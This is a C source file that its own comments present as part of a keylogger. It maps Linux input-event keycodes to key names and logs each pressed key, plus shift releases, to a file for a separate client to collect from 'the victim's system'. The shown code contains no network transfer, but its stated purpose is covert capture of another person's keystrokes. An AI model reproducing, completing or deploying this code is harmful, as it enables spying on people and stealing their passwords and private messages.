#include <stdio.h>
#include <linux/input.h>
#include <linux/input-event-codes.h> // all keycodes defined here
#include <ctype.h>

#define KEYPRESSED 1
#define KEYRELEASED 0

/* Brief explanation of key mapping philosophy: 
 * 	- The keylogger itself does the minimum neccessary parsing, simply using the 
 * 	  key code definitions as defined by the victim's system to convert raw keycodes
 * 	  into something that can be parsed by the client.
 * 	- The client downloads the semi-parsed keycodes and fully parses for a human 
 * 	  to examine.
 */
    
/* Using the key code definitions in linxux/input-event-codes, takes a key code
 * and prints out the name of the corresponding key.
 */
#define log_keys_lazily(file, code) do { \
	switch (code) { \
		case KEY_RESERVED: 				fprintf(file, "<RESERVED>"); break; \
		case KEY_ESC: 					fprintf(file, "<ESC>"); break; \
		case KEY_1: 					fprintf(file, "<1>"); break; \
		case KEY_2: 					fprintf(file, "<2>"); break; \
		case KEY_3: 					fprintf(file, "<3>"); break; \
		case KEY_4: 					fprintf(file, "<4>"); break; \
		case KEY_5: 					fprintf(file, "<5>"); break; \
		case KEY_6: 					fprintf(file, "<6>"); break; \
		case KEY_7: 					fprintf(file, "<7>"); break; \
		case KEY_8: 					fprintf(file, "<8>"); break; \
		case KEY_9: 					fprintf(file, "<9>"); break; \
		case KEY_0: 					fprintf(file, "<0>"); break; \
		case KEY_MINUS: 				fprintf(file, "<MINUS>"); break; \
		case KEY_EQUAL: 				fprintf(file, "<EQUAL>"); break; \
		case KEY_BACKSPACE: 			fprintf(file, "<BACKSPACE>"); break; \
		case KEY_TAB: 					fprintf(file, "<TAB>"); break; \
		case KEY_Q: 					fprintf(file, "<Q>"); break; \
		case KEY_W: 					fprintf(file, "<W>"); break; \
		case KEY_E: 					fprintf(file, "<E>"); break; \
		case KEY_R: 					fprintf(file, "<R>"); break; \
		case KEY_T: 					fprintf(file, "<T>"); break; \
		case KEY_Y: 					fprintf(file, "<Y>"); break; \
		case KEY_U: 					fprintf(file, "<U>"); break; \
		case KEY_I: 					fprintf(file, "<I>"); break; \
		case KEY_O: 					fprintf(file, "<O>"); break; \
		case KEY_P: 					fprintf(file, "<P>"); break; \
		case KEY_LEFTBRACE: 			fprintf(file, "<LEFTBRACE>"); break; \
		case KEY_RIGHTBRACE: 			fprintf(file, "<RIGHTBRACE>"); break; \
		case KEY_ENTER: 				fprintf(file, "<ENTER>"); break; \
		case KEY_LEFTCTRL: 				fprintf(file, "<LEFTCTRL>"); break; \
		case KEY_A: 					fprintf(file, "<A>"); break; \
		case KEY_S: 					fprintf(file, "<S>"); break; \
		case KEY_D: 					fprintf(file, "<D>"); break; \
		case KEY_F: 					fprintf(file, "<F>"); break; \
		case KEY_G: 					fprintf(file, "<G>"); break; \
		case KEY_H: 					fprintf(file, "<H>"); break; \
		case KEY_J: 					fprintf(file, "<J>"); break; \
		case KEY_K: 					fprintf(file, "<K>"); break; \
		case KEY_L: 					fprintf(file, "<L>"); break; \
		case KEY_SEMICOLON: 			fprintf(file, "<SEMICOLON>"); break; \
		case KEY_APOSTROPHE: 			fprintf(file, "<APOSTROPHE>"); break; \
		case KEY_GRAVE: 				fprintf(file, "<GRAVE>"); break; \
		case KEY_LEFTSHIFT: 			fprintf(file, "<LEFTSHIFT>"); break; \
		case KEY_BACKSLASH: 			fprintf(file, "<BACKSLASH>"); break; \
		case KEY_Z: 					fprintf(file, "<Z>"); break; \
		case KEY_X: 					fprintf(file, "<X>"); break; \
		case KEY_C: 					fprintf(file, "<C>"); break; \
		case KEY_V: 					fprintf(file, "<V>"); break; \
		case KEY_B: 					fprintf(file, "<B>"); break; \
		case KEY_N: 					fprintf(file, "<N>"); break; \
		case KEY_M: 					fprintf(file, "<M>"); break; \
		case KEY_COMMA: 				fprintf(file, "<COMMA>"); break; \
		case KEY_DOT: 					fprintf(file, "<DOT>"); break; \
		case KEY_SLASH: 				fprintf(file, "<SLASH>"); break; \
		case KEY_RIGHTSHIFT: 			fprintf(file, "<RIGHTSHIFT>"); break; \
		case KEY_KPASTERISK: 			fprintf(file, "<KPASTERISK>"); break; \
		case KEY_LEFTALT: 				fprintf(file, "<LEFTALT>"); break; \
		case KEY_SPACE: 				fprintf(file, "<SPACE>"); break; \
		case KEY_CAPSLOCK: 				fprintf(file, "<CAPSLOCK>"); break; \
		case KEY_F1: 					fprintf(file, "<F1>"); break; \
		case KEY_F2: 					fprintf(file, "<F2>"); break; \
		case KEY_F3: 					fprintf(file, "<F3>"); break; \
		case KEY_F4: 					fprintf(file, "<F4>"); break; \
		case KEY_F5: 					fprintf(file, "<F5>"); break; \
		case KEY_F6: 					fprintf(file, "<F6>"); break; \
		case KEY_F7: 					fprintf(file, "<F7>"); break; \
		case KEY_F8: 					fprintf(file, "<F8>"); break; \
		case KEY_F9: 					fprintf(file, "<F9>"); break; \
		case KEY_F10: 					fprintf(file, "<F10>"); break; \
		case KEY_NUMLOCK: 				fprintf(file, "<NUMLOCK>"); break; \
		case KEY_SCROLLLOCK: 			fprintf(file, "<SCROLLLOCK>"); break; \
		case KEY_KP7: 					fprintf(file, "<KP7>"); break; \
		case KEY_KP8: 					fprintf(file, "<KP8>"); break; \
		case KEY_KP9: 					fprintf(file, "<KP9>"); break; \
		case KEY_KPMINUS: 				fprintf(file, "<KPMINUS>"); break; \
		case KEY_KP4: 					fprintf(file, "<KP4>"); break; \
		case KEY_KP5: 					fprintf(file, "<KP5>"); break; \
		case KEY_KP6: 					fprintf(file, "<KP6>"); break; \
		case KEY_KPPLUS: 				fprintf(file, "<KPPLUS>"); break; \
		case KEY_KP1: 					fprintf(file, "<KP1>"); break; \
		case KEY_KP2: 					fprintf(file, "<KP2>"); break; \
		case KEY_KP3: 					fprintf(file, "<KP3>"); break; \
		case KEY_KP0: 					fprintf(file, "<KP0>"); break; \
		case KEY_KPDOT:					fprintf(file, "<KPDOT>"); break; \
		case KEY_ZENKAKUHANKAKU:		fprintf(file, "<ZENKAKUHANKAKU>"); break; \
		case KEY_102ND: 				fprintf(file, "<102ND>"); break; \
		case KEY_F11: 					fprintf(file, "<F11>"); break; \
		case KEY_F12: 					fprintf(file, "<F12>"); break; \
		case KEY_RO: 					fprintf(file, "<RO>"); break; \
		case KEY_KATAKANA: 	 			fprintf(file, "<KATAKANA>"); break; \
		case KEY_HIRAGANA: 				fprintf(file, "<HIRAGANA>"); break; \
		case KEY_HENKAN: 				fprintf(file, "<HENKAN>"); break; \
		case KEY_KATAKANAHIRAGANA: 		fprintf(file, "<KATAKANAHIRAGANA>"); break; \
		case KEY_MUHENKAN: 				fprintf(file, "<MUHENKAN>"); break; \
		case KEY_KPJPCOMMA: 			fprintf(file, "<KPJPCOMMA>"); break; \
		case KEY_KPENTER: 				fprintf(file, "<KPENTER>"); break; \
		case KEY_RIGHTCTRL: 			fprintf(file, "<RIGHTCTRL>"); break; \
		case KEY_KPSLASH: 				fprintf(file, "<KPSLASH>"); break; \
		case KEY_SYSRQ: 				fprintf(file, "<SYSRQ>"); break; \
		case KEY_RIGHTALT: 				fprintf(file, "<RIGHTALT>"); break; \
		case KEY_LINEFEED: 				fprintf(file, "<LINEFEED>"); break; \
		case KEY_HOME: 					fprintf(file, "<HOME>"); break; \
		case KEY_UP: 					fprintf(file, "<UP>"); break; \
		case KEY_PAGEUP: 				fprintf(file, "<PAGEUP>"); break; \
		case KEY_LEFT: 					fprintf(file, "<LEFT>"); break; \
		case KEY_RIGHT: 				fprintf(file, "<RIGHT>"); break; \
		case KEY_END: 					fprintf(file, "<END>"); break; \
		case KEY_DOWN: 					fprintf(file, "<DOWN>"); break; \
		case KEY_PAGEDOWN: 				fprintf(file, "<PAGEDOWN>"); break; \
		case KEY_INSERT: 				fprintf(file, "<INSERT>"); break; \
		case KEY_DELETE: 				fprintf(file, "<DELETE>"); break; \
		case KEY_MACRO: 				fprintf(file, "<MACRO>"); break; \
		case KEY_MUTE: 					fprintf(file, "<MUTE>"); break; \
		case KEY_VOLUMEDOWN: 			fprintf(file, "<VOLUMEDOWN>"); break; \
		case KEY_VOLUMEUP: 				fprintf(file, "<VOLUMEUP>"); break; \
		case KEY_POWER: 				fprintf(file, "<POWER>"); break; \
		case KEY_KPEQUAL: 				fprintf(file, "<KPEQUAL>"); break; \
		case KEY_KPPLUSMINUS: 			fprintf(file, "<KPPLUSMINUS>"); break; \
		case KEY_PAUSE: 				fprintf(file, "<PAUSE>"); break; \
		case KEY_SCALE: 				fprintf(file, "<SCALE>"); break; \
		case KEY_KPCOMMA: 				fprintf(file, "<KPCOMMA>"); break; \
		case KEY_HANGEUL: 				fprintf(file, "<HANGEUL>"); break; \
		case KEY_HANJA: 				fprintf(file, "<HANJA>"); break; \
		case KEY_YEN: 					fprintf(file, "<YEN>"); break; \
		case KEY_LEFTMETA: 				fprintf(file, "<LEFTMETA>"); break; \
		case KEY_RIGHTMETA: 			fprintf(file, "<RIGHTMETA>"); break; \
		case KEY_COMPOSE: 				fprintf(file, "<COMPOSE>"); break; \
		case KEY_STOP: 					fprintf(file, "<STOP>"); break; \
		case KEY_AGAIN: 				fprintf(file, "<AGAIN>"); break; \
		case KEY_PROPS: 				fprintf(file, "<PROPS>"); break; \
		case KEY_UNDO: 					fprintf(file, "<UNDO>"); break; \
		case KEY_FRONT: 				fprintf(file, "<FRONT>"); break; \
		case KEY_COPY: 					fprintf(file, "<COPY>"); break; \
		case KEY_OPEN: 					fprintf(file, "<OPEN>"); break; \
		case KEY_PASTE: 				fprintf(file, "<PASTE>"); break; \
		case KEY_FIND: 					fprintf(file, "<FIND>"); break; \
		case KEY_CUT: 					fprintf(file, "<CUT>"); break; \
		case KEY_HELP: 					fprintf(file, "<HELP>"); break; \
		case KEY_MENU: 					fprintf(file, "<MENU>"); break; \
		case KEY_CALC: 					fprintf(file, "<CALC>"); break; \
		case KEY_SETUP: 				fprintf(file, "<SETUP>"); break; \
		case KEY_SLEEP: 				fprintf(file, "<SLEEP>"); break; \
		case KEY_WAKEUP: 				fprintf(file, "<WAKEUP>"); break; \
		case KEY_FILE: 					fprintf(file, "<FILE>"); break; \
		case KEY_SENDFILE: 				fprintf(file, "<SENDFILE>"); break; \
		case KEY_DELETEFILE: 			fprintf(file, "<DELETEFILE>"); break; \
		case KEY_XFER: 					fprintf(file, "<XFER>"); break; \
		case KEY_PROG1: 				fprintf(file, "<PROG1>"); break; \
		case KEY_PROG2: 				fprintf(file, "<PROG2>"); break; \
		case KEY_WWW: 					fprintf(file, "<WWW>"); break; \
		case KEY_MSDOS: 				fprintf(file, "<MSDOS>"); break; \
		case KEY_COFFEE: 				fprintf(file, "<COFFEE>"); break; \
		case KEY_ROTATE_DISPLAY:		fprintf(file, "<ROTATE_DISPLAY>"); break; \
		case KEY_CYCLEWINDOWS: 			fprintf(file, "<CYCLEWINDOWS>"); break; \
		case KEY_MAIL: 					fprintf(file, "<MAIL>"); break; \
		case KEY_BOOKMARKS: 			fprintf(file, "<BOOKMARKS>"); break; \
		case KEY_COMPUTER: 				fprintf(file, "<COMPUTER>"); break; \
		case KEY_BACK: 					fprintf(file, "<BACK>"); break; \
		case KEY_FORWARD: 				fprintf(file, "<FORWARD>"); break; \
		case KEY_CLOSECD: 				fprintf(file, "<CLOSECD>"); break; \
		case KEY_EJECTCD: 				fprintf(file, "<EJECTCD>"); break; \
		case KEY_EJECTCLOSECD: 			fprintf(file, "<EJECTCLOSECD>"); break; \
		case KEY_NEXTSONG: 				fprintf(file, "<NEXTSONG>"); break; \
		case KEY_PLAYPAUSE: 			fprintf(file, "<PLAYPAUSE>"); break; \
		case KEY_PREVIOUSSONG: 			fprintf(file, "<PREVIOUSSONG>"); break; \
		case KEY_STOPCD: 				fprintf(file, "<STOPCD>"); break; \
		case KEY_RECORD: 				fprintf(file, "<RECORD>"); break; \
		case KEY_REWIND: 				fprintf(file, "<REWIND>"); break; \
		case KEY_PHONE: 				fprintf(file, "<PHONE>"); break; \
		case KEY_ISO: 					fprintf(file, "<ISO>"); break; \
		case KEY_CONFIG: 				fprintf(file, "<CONFIG>"); break; \
		case KEY_HOMEPAGE: 				fprintf(file, "<HOMEPAGE>"); break; \
		case KEY_REFRESH: 				fprintf(file, "<REFRESH>"); break; \
		case KEY_EXIT: 					fprintf(file, "<EXIT>"); break; \
		case KEY_MOVE: 					fprintf(file, "<MOVE>"); break; \
		case KEY_EDIT: 					fprintf(file, "<EDIT>"); break; \
		case KEY_SCROLLUP: 				fprintf(file, "<SCROLLUP>"); break; \
		case KEY_SCROLLDOWN: 			fprintf(file, "<SCROLLDOWN>"); break; \
		case KEY_KPLEFTPAREN: 			fprintf(file, "<KPLEFTPAREN>"); break; \
		case KEY_KPRIGHTPAREN: 			fprintf(file, "<KPRIGHTPAREN>"); break; \
		case KEY_NEW: 					fprintf(file, "<NEW>"); break; \
		case KEY_REDO: 					fprintf(file, "<REDO>"); break; \
		case KEY_F13: 					fprintf(file, "<F13>"); break; \
		case KEY_F14: 					fprintf(file, "<F14>"); break; \
		case KEY_F15: 					fprintf(file, "<F15>"); break; \
		case KEY_F16: 					fprintf(file, "<F16>"); break; \
		case KEY_F17: 					fprintf(file, "<F17>"); break; \
		case KEY_F18: 					fprintf(file, "<F18>"); break; \
		case KEY_F19: 					fprintf(file, "<F19>"); break; \
		case KEY_F20: 					fprintf(file, "<F20>"); break; \
		case KEY_F21: 					fprintf(file, "<F21>"); break; \
		case KEY_F22: 					fprintf(file, "<F22>"); break; \
		case KEY_F23: 					fprintf(file, "<F23>"); break; \
		case KEY_F24: 					fprintf(file, "<F24>"); break; \
		case KEY_PLAYCD: 				fprintf(file, "<PLAYCD>"); break; \
		case KEY_PAUSECD: 				fprintf(file, "<PAUSECD>"); break; \
		case KEY_PROG3: 				fprintf(file, "<PROG3>"); break; \
		case KEY_PROG4: 				fprintf(file, "<PROG4>"); break; \
		case KEY_SUSPEND: 				fprintf(file, "<SUSPEND>"); break; \
		case KEY_CLOSE: 				fprintf(file, "<CLOSE>"); break; \
		case KEY_PLAY: 					fprintf(file, "<PLAY>"); break; \
		case KEY_FASTFORWARD: 			fprintf(file, "<FASTFORWARD>"); break; \
		case KEY_BASSBOOST: 			fprintf(file, "<BASSBOOST>"); break; \
		case KEY_PRINT: 				fprintf(file, "<PRINT>"); break; \
		case KEY_HP: 					fprintf(file, "<HP>"); break; \
		case KEY_CAMERA: 				fprintf(file, "<CAMERA>"); break; \
		case KEY_SOUND: 				fprintf(file, "<SOUND>"); break; \
		case KEY_QUESTION: 				fprintf(file, "<QUESTION>"); break; \
		case KEY_EMAIL: 				fprintf(file, "<EMAIL>"); break; \
		case KEY_CHAT: 					fprintf(file, "<CHAT>"); break; \
		case KEY_SEARCH: 				fprintf(file, "<SEARCH>"); break; \
		case KEY_CONNECT: 				fprintf(file, "<CONNECT>"); break; \
		case KEY_FINANCE: 				fprintf(file, "<FINANCE>"); break; \
		case KEY_SPORT: 				fprintf(file, "<SPORT>"); break; \
		case KEY_SHOP: 					fprintf(file, "<SHOP>"); break; \
		case KEY_ALTERASE: 				fprintf(file, "<ALTERASE>"); break; \
		case KEY_CANCEL: 				fprintf(file, "<CANCEL>"); break; \
		case KEY_BRIGHTNESSDOWN:		fprintf(file, "<BRIGHTNESSDOWN>"); break; \
		case KEY_BRIGHTNESSUP: 			fprintf(file, "<BRIGHTNESSUP>"); break; \
		case KEY_MEDIA: 				fprintf(file, "<MEDIA>"); break; \
		case KEY_SWITCHVIDEOMODE:		fprintf(file, "<SWITCHVIDEOMODE>"); break; \
		case KEY_KBDILLUMTOGGLE:		fprintf(file, "<KBDILLUMTOGGLE>"); break; \
		case KEY_KBDILLUMDOWN: 			fprintf(file, "<KBDILLUMDOWN>"); break; \
		case KEY_KBDILLUMUP: 			fprintf(file, "<KBDILLUMUP>"); break; \
		case KEY_SEND: 					fprintf(file, "<SEND>"); break; \
		case KEY_REPLY: 				fprintf(file, "<REPLY>"); break; \
		case KEY_FORWARDMAIL: 			fprintf(file, "<FORWARDMAIL>"); break; \
		case KEY_SAVE: 					fprintf(file, "<SAVE>"); break; \
		case KEY_DOCUMENTS: 			fprintf(file, "<DOCUMENTS>"); break; \
		case KEY_BATTERY: 				fprintf(file, "<BATTERY>"); break; \
		case KEY_BLUETOOTH: 			fprintf(file, "<BLUETOOTH>"); break; \
		case KEY_WLAN: 					fprintf(file, "<WLAN>"); break; \
		case KEY_UWB: 					fprintf(file, "<UWB>"); break; \
		case KEY_UNKNOWN: 				fprintf(file, "<UNKNOWN>"); break; \
		case KEY_VIDEO_NEXT: 			fprintf(file, "<VIDEO_NEXT>"); break; \
		case KEY_VIDEO_PREV: 			fprintf(file, "<VIDEO_PREV>"); break; \
		case KEY_BRIGHTNESS_CYCLE: 		fprintf(file, "<BRIGHTNESS_CYCLE>"); break; \
		case KEY_BRIGHTNESS_AUTO: 		fprintf(file, "<BRIGHTNESS_AUTO>"); break; \
		case KEY_DISPLAY_OFF: 			fprintf(file, "<DISPLAY_OFF>"); break; \
		case KEY_WWAN: 					fprintf(file, "<WWAN>"); break; \
		case KEY_RFKILL: 				fprintf(file, "<RFKILL>"); break; \
		case KEY_MICMUTE: 				fprintf(file, "<MICMUTE>"); break; \
	} \
} while(0)

/*  
    This will log keystrokes in a relatively raw way into the provided file. It should 
	be parsed by the client for best results.
*/
void log_keystroke_humanformat(FILE * file, struct input_event event)
{
	if (event.value == KEYRELEASED) {
		switch(event.code) {
			case KEY_LEFTSHIFT:		fprintf(file, "<LEFTSHIFT_RELEASED>"); break;
			case KEY_RIGHTSHIFT:	fprintf(file, "<RIGHTSHIFT_RELEASED>"); break;
		}
	}
    else if (event.value == KEYPRESSED)
		log_keys_lazily(file, event.code);
	fflush(file);
}
